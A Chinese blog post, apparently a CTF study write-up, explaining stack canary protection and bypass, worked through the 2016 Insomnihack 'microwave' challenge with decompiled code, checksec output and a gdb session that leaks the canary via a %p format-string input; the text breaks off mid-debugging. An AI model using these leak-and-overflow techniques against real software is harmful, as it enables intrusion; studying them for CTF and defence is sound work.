<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <title>绕过ELF的安全防护机制Canary | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfpwn">
  
  
  
  
  <meta name="description" content="入门 canary。">
<meta name="keywords" content="ctf,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="绕过ELF的安全防护机制Canary">
<meta property="og:url" content="https://qianfei11.github.io/2019/02/15/绕过ELF的安全防护机制Canary/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="入门 canary。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://qianfei11.github.io/pics/绕过ELF的安全防护机制Canary/1.png">
<meta property="og:updated_time" content="2019-08-26T05:55:00.833Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="绕过ELF的安全防护机制Canary">
<meta name="twitter:description" content="入门 canary。">
<meta name="twitter:image" content="https://qianfei11.github.io/pics/绕过ELF的安全防护机制Canary/1.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  


<!-- hexo-inject:begin --><!-- hexo-inject:end --><header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-绕过ELF的安全防护机制Canary" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      绕过ELF的安全防护机制Canary
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2019/02/15/绕过ELF的安全防护机制Canary/" class="article-date">
	  <time datetime="2019-02-15T08:21:43.000Z" itemprop="datePublished">February 15, 2019</time>
	</a>

       
      

	  |
	  6.2k words
	  |
	  33 minute(s) to read
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>入门 canary。</p>
<a id="more"></a>
<h1 id="何为-Canary"><a href="#何为-Canary" class="headerlink" title="何为 Canary"></a>何为 Canary</h1><p>由于<code>stack overflow</code>而引发的攻击非常普遍也非常古老，相应地一种叫做<code>Canary</code>的技术很早就出现在<code>glibc</code>里，直到现在也作为系统安全的第一道防线存在。<code>Canary</code>的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的 canary 值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。<code>Canary</code>不管是实现还是设计思想都比较简单高效，就是插入一个值，在<code>stack overflow</code>发生的高危区域的尾部，当函数返回之时检测<code>Canary</code>的值是否经过了改变，以此来判断<code>stack/buffer overflow</code>是否发生。<code>Canary</code>与 Windows 下的<code>GS保护</code>都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了<code>linux</code>下保护机制的标配。</p>
<p>以 32 位程序为例。没开 Canary 时的栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p>开启 Canary 后的栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|      canary      | &lt;- Random</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p>在<code>EBP</code>之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测<code>Canary</code>是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖<code>Canary</code>，这时程序会直接退出。只有泄漏了<code>Canary</code>，才能 overflow 后面的 return address：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x804852b &lt;func+71&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x804852e &lt;func+74&gt;:	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">=&gt; 0x8048535 &lt;func+81&gt;:	je     0x804853c &lt;func+88&gt;</span><br><span class="line"> | 0x8048537 &lt;func+83&gt;:	call   0x8048390 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> | 0x804853c &lt;func+88&gt;:	leave</span><br><span class="line"> | 0x804853d &lt;func+89&gt;:	ret</span><br><span class="line"> | 0x804853e &lt;main&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line"> |-&gt;   0x804853c &lt;func+88&gt;:	leave</span><br><span class="line">       0x804853d &lt;func+89&gt;:	ret</span><br></pre></td></tr></table></figure>
<p>如果没有绕过<code>Canary</code>，就会<code>call</code>到 glibc 中的函数<code>__stack_chk_fail</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Canary绕过技术"><a href="#Canary绕过技术" class="headerlink" title="Canary绕过技术"></a><code>Canary</code>绕过技术</h1><h2 id="泄漏Canary"><a href="#泄漏Canary" class="headerlink" title="泄漏Canary"></a>泄漏<code>Canary</code></h2><p><code>Canary</code>设计为以字节<code>\x00</code>结尾，本意是为了保证<code>Canary</code>可以截断字符串。泄露栈中的<code>Canary</code>的思路是覆盖<code>Canary</code>的低字节，来打印出剩余的<code>Canary</code>部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露<code>Canary</code>，之后再次溢出控制执行流程。如果存在<code>format string</code>那么还可以泄漏<code>Canary</code>。</p>
<h3 id="2016-insomnihack-microwave"><a href="#2016-insomnihack-microwave" class="headerlink" title="2016-insomnihack-microwave"></a>2016-insomnihack-microwave</h3><p><code>checksec</code>一下程序，64 位 elf，保护全开：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>拖进 ida 查看一下程序。程序大概上是连接 tweeter 账户，编辑内容，发布最喜爱食物：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x3E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n --------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |     Welcome to the next generation of MicroWaves!    |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" | This stylish Microwave with Grill function, includes |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |      a function that tweets your favourite food!     |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" --------------------------------------------------------"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      choice();</span><br><span class="line">      fwrite(<span class="string">"\n           [MicroWave]: "</span>, <span class="number">1u</span>LL, <span class="number">0x19</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      fgets(&amp;input, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( input != <span class="string">'2'</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        edit();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      First: please connect to your Twitter account!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x37</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input &lt;= <span class="string">'2'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input == <span class="string">'1'</span> )                       <span class="comment">// choice 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">"\n           Log in on Twitter:\n"</span>, <span class="number">1u</span>LL, <span class="number">0x1F</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fwrite(<span class="string">"           username: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3, <span class="number">40</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        fwrite(<span class="string">"           password: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3 + <span class="number">40</span>, <span class="number">20</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        connect(v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'3'</span> )                    <span class="comment">// choice 3</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        tweet();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      Hey Dude! This didn't work out!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x28</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'q'</span> )                    <span class="comment">// quit</span></span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"\n           Bye!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>connect()</code>函数中，发现了一个需要过的 check 密码，同时还有用户名的输入存在<code>format string</code>，故这里可以泄漏出栈上的<code>Canary</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">connect</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> j; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">1L</span>L;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\nChecking "</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)input);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Twitter account"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( j &lt; <span class="built_in">strlen</span>(input + <span class="number">40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ++j;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'.'</span>);</span><br><span class="line">    fflush(<span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0x186A0</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">string</span> = password;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(password);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_WORD *)input + <span class="number">30</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input[i + <span class="number">40</span>] != <span class="built_in">string</span>[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_WORD *)input + <span class="number">30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>edit()</code>函数中存在<code>buffer overflow</code>，读了很长一串字符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\n           #&gt; "</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n           Done."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时通过调试可以找到栈上的某个值与 libc 的偏移，以用来计算 base：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwave</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./microwave...(no debugging symbols found)...done.</span><br><span class="line">assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6</span><br><span class="line">assassinq&gt;&gt; r</span><br><span class="line">Starting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line"></span><br><span class="line"> --------------------------------------------------------</span><br><span class="line"> |     Welcome to the next generation of MicroWaves!    |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> | This stylish Microwave with Grill function, includes |</span><br><span class="line"> |      a function that tweets your favourite food!     |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> --------------------------------------------------------</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: 1</span><br><span class="line"></span><br><span class="line">           Log in on Twitter:</span><br><span class="line">           username: %p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">           password: n07_7h3_fl46</span><br><span class="line"></span><br><span class="line">Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710</span><br><span class="line">Twitter account</span><br><span class="line">............</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: ^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00</span><br><span class="line">RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288</span><br><span class="line">RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x400</span><br><span class="line">RSI: 0x555555759060 (&quot;n07_7h3_fl46\np.%p.%p.%p\n&quot;)</span><br><span class="line">RDI: 0x0</span><br><span class="line">RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887</span><br><span class="line">RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:	cmp    